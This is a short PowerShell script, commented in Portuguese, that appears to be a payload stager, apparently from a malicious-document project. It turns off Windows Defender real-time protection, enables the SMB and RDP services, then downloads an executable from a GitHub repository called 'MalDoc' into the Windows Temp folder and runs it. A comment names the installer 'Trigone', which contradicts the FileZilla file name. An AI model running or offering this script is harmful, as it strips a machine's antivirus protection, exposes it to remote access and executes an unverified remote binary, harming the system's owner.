Set-MpPreference -DisableRealtimeMonitoring $true

# Habilite o serviço SMB
Set-Service -Name "LanmanServer" -StartupType 'Automatic'
Start-Service -Name "LanmanServer"

# Habilite o serviço RDP

Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0

# Defina a URL do download do FileZilla
$FileZillaDownloadURL = "https://github.com/jovair1994/MalDoc/raw/main/FileZilla_Server_1.8.0_win64-setup.exe"

# Defina o caminho de destino onde o arquivo será baixado
$DownloadPath = "C:\Windows\Temp\FileZilla.exe"

# Baixe o arquivo usando o URL
Invoke-WebRequest -Uri $FileZillaDownloadURL -OutFile $DownloadPath

# Execute o instalador do Trigone
Start-Process -FilePath $DownloadPath -Wait

# Aguarde a instalação ser concluÃ­da
Start-Sleep -Seconds 100  # Ajuste o tempo de espera conforme necessário

